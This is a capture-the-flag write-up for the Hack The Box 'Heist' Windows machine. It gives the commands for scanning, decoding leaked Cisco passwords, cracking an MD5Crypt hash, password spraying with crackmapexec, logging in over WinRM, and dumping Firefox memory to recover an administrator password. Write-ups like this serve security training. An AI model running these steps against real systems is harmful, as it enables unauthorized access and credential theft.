---
title: "HTB - Heist"
date: 2026-05-03
draft: false
tags: ["HTB", "Windows", "Write-Up"]
cover:
    image: "/images/writeup_screens/htb_heist/htb_heist_cover.png"      
    alt: "HTB Heist Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| Difficulty | Easy |
| Type | Windows |

**Port Scan**
```
└─$ nmap -sV -sC 10.129.96.157
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 19:17 +0200
Nmap scan report for 10.129.96.157
Host is up (0.069s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

## User Flag

On the webserver on port **80** we can login as guest. We are redirected to _/issues.php_ and can read a posting of user **Hazard** which has an attachment _config.txt_: 

![](/images/writeup_screens/htb_heist/htb_heist1.png)

The file is a Cisco Router configuration and leaks two encrypted passwords. The password strings are **Type 7** which is easily crackable with various [online tools](https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html). 

```
rout3er | 0242114B0E143F015F5D1E161713 | $uperP@ssword
admin | 02375012182C1A1D751618034F36415408 | Q4)sJu\Y8qz*A3?d
```

Moreover, there is a password hash a few lines above which is **MD5Crypt** as i found out by feeding the string into a [hash identifier](https://hashes.com/en/tools/hash_identifier). 

```
$1$pdQG$o8nrSzsGXeaduXrjlvKc91 - MD5Crypt
```

I used the following command to offline crack the hash and got the clear text password after a few minutes: 

```
$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt 

$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
```

Now we have valid credentials for the user **Hazard** on the Windows machine. We can confirm this by trying to authenticate via **SMB** with the following command:

```
$ crackmapexec smb 10.129.96.157 -u hazard -p stealth1agent
```

Port **5985** is open on the target machine which means we should be able to get command execution via **WinRM** with a user that has the right privileges (Remote Management Users Group). I tried to connect via **evil-winrm** as user **Hazard** but received an error so we have to find another way. 

Luckily for us, we now have a valid Windows account and can utilize it to enumerate other users via **SMB/RPC**. The Tool **enum4linx** is great for this use case since it tries to find users on the system using various different methods automatically. We can run the following command to start the tool with the obtained credentials: 

```
$ enum4linux -u 'hazard' -p 'stealth1agent' -a 10.129.96.157
```

After some time, we can see the following user list in the output of the tool: 

![](/images/writeup_screens/htb_heist/htb_heist2.png)

Now we can do some password/user spraying. I created a text file with all of the non standard user names above seperated by new lines as well as another file with the two passwords we obtained from the router configuration file:

``` 
winusers.txt

Administrator
Hazard
support
Chase
Jason
```

```
passwords.txt

$uperP@ssword
Q4)sJu\Y8qz*A3?d
```

Then I used **crackmapexec** to try to authenticate via **SMB** with all possible credential combinations to find a valid one:

```
$ crackmapexec smb 10.129.96.157 -u winusers.txt -p passwords.txt
```

I found the valid credential combination `Chase:Q4)sJu\Y8qz*A3?d` with which i subsequently tried to autenticate via **winRM** with the following command:

```
$ evil-winrm -i 10.129.96.157 -u Chase -p "Q4)sJu\Y8qz*A3?d"
``` 

![](/images/writeup_screens/htb_heist/htb_heist3.png)

I successfully got command execution as **Chase** and was able to read _C:\Users\Chase\Desktop\user.txt_. 

## Root Flag

We can find the text file _todo.txt_ on the Desktop of **Chase**:

```
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

I looked through the running processes with `get-process` and noticed that **Firefox** is active. Chase was mentioning the issues list in his TODO file so maybe he addresses the issues in the support web application. I wanted to dump the process to see if i can find anything interesting in it. 

I uploaded _procdump64.exe_ and dumped the whole **Firefox** process with the following command:

```
> .\procdump64.exe -ma 6364 firefox.dmp
```

I then downloaded the dump file to my attacker machine so i can analyze it further (download functionality of **evilwinrm** will be a bit slow so maybe use **impacket-smbserver** to speed up the process). Then i searched for the word 'password' in the dump file:

`$ strings firefox.dmp | grep password`

I found the following cached HTTP request with the password for the admin user: 

![](/images/writeup_screens/htb_heist/htb_heist4.png)

With the newly obtained password i was able to access the machine via **evil-winrm** as **Administrator** and read _C:\Users\Administrator\Desktop\root.txt_